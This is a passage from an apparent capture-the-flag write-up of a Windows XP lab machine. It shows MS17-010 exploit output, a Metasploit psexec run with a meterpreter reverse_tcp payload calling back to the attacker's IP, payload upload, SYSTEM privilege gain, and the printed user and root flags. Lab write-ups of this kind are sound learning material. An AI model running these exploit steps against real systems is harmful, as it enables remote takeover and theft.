modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x82153578
SESSION: 0xe10c88d8
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe21ac980
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe21aca20
overwriting token UserAndGroups
creating file c:\pwned.txt on the target
Opening SVCManager on 10.129.1.111.....
Creating service gAQi.....
Starting service gAQi.....
SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
Removing service gAQi.....
Opening SVCManager on 10.129.1.111.....
Creating service CcMW.....
Starting service CcMW.....
SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
Removing service CcMW.....
Done
```

At this point I started to get a little frustrated. Windows XP is older then eternal blue, so I got a tip to use [this old exploit instead](https://github.com/andyacer/ms08_067). After some fiddling around I still did not get it working. So I decided to go for a metasploit module based around ms08_067. Turned out the be the wrong choice since this was the moment I had a major brainfart. And then I ended up going back to ms17-010:

```
msf6 exploit(windows/smb/ms08_067_netapi) > use windows/smb/ms17_010_psexec
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 10.10.14.33
lhost => 10.10.14.33
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                 Required  Description
   ----                  ---------------                                                 --------  -----------
   DBGTRACE              false                                                           yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                             yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                  no        The service display name
   SERVICE_NAME                                                                          no        The service name
   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                               no        The password for the specified username
   SMBUser                                                                               no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.33      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/ms17_010_psexec) > set rhosts 10.129.1.111
rhosts => 10.129.1.111
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[-] Handler failed to bind to 10.10.14.33:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] 10.129.1.111:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_psexec) > set lport 666
lport => 666
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.33:666 
[*] 10.129.1.111:445 - Target OS: Windows 5.1
[-] 10.129.1.111:445 - Unable to find accessible named pipe!
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_psexec) > Interrupt: use the 'exit' command to quit
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.33:666 
[*] 10.129.1.111:445 - Target OS: Windows 5.1
[*] 10.129.1.111:445 - Filling barrel with fish... done
[*] 10.129.1.111:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.129.1.111:445 - 	[*] Preparing dynamite...
[*] 10.129.1.111:445 - 		[*] Trying stick 1 (x86)...Boom!
[*] 10.129.1.111:445 - 	[+] Successfully Leaked Transaction!
[*] 10.129.1.111:445 - 	[+] Successfully caught Fish-in-a-barrel
[*] 10.129.1.111:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.129.1.111:445 - Reading from CONNECTION struct at: 0x820b7c90
[*] 10.129.1.111:445 - Built a write-what-where primitive...
[+] 10.129.1.111:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.1.111:445 - Selecting native target
[*] 10.129.1.111:445 - Uploading payload... jogUrJBT.exe
[*] 10.129.1.111:445 - Created \jogUrJBT.exe...
[+] 10.129.1.111:445 - Service started successfully...
[*] 10.129.1.111:445 - Deleting \jogUrJBT.exe...
[*] Sending stage (175174 bytes) to 10.129.1.111
[*] Meterpreter session 1 opened (10.10.14.33:666 -> 10.129.1.111:1047) at 2021-02-11 11:14:59 -0500

meterpreter > dir
Listing: C:\WINDOWS\system32
============================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  261       fil   2017-03-16 01:20:00 -0400  $winnt$.inf
40777/rwxrwxrwx   0         dir   2017-03-16 01:18:34 -0400  1025
40777/rwxrwxrwx   0         dir   2017-03-16 01:18:34 -0400  1028
40777/rwxrwxrwx   0         dir   2017-03-16 01:18:34 -0400  1031
40777/rwxrwxrwx   0         dir   2017-03-16 01:18:34 -0400  1033
40777/rwxrwxrwx   0         dir   2017-03-16 01:18:34 -0400  1037

```

I had to restart and reset the machine several times in order for me to get a working shell, idk what it is but today is not my day. User was easy found after this:

```
:\>dir user.txt /s /p
dir user.txt /s /p
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19 ��                32 user.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)   6.297.243.648 bytes free

C:\>C:\Documents and Settings\john\Desktop
C:\Documents and Settings\john\Desktop
'C:\Documents' is not recognized as an internal or external command,
operable program or batch file.

C:\>cd C:\Documents and Settings\john\Desktop
cd C:\Documents and Settings\john\Desktop

C:\Documents and Settings\john\Desktop>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Documents and Settings\john\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  08:19 ��    <DIR>          .
16/03/2017  08:19 ��    <DIR>          ..
16/03/2017  08:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.297.243.648 bytes free

C:\Documents and Settings\john\Desktop>cat user.txt
cat user.txt
'cat' is not recognized as an internal or external command,
operable program or batch file.

C:\Documents and Settings\john\Desktop>echo user.txt
echo user.txt
user.txt

C:\Documents and Settings\john\Desktop>Get-Content user.txt
Get-Content user.txt
'Get-Content' is not recognized as an internal or external command,
operable program or batch file.

C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
C:\Documents and Settings\john\Desktop>e69af0e4f443de7e36876fda4ec7644f


C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop>

```

GG WP, I hate windows. 5/10.

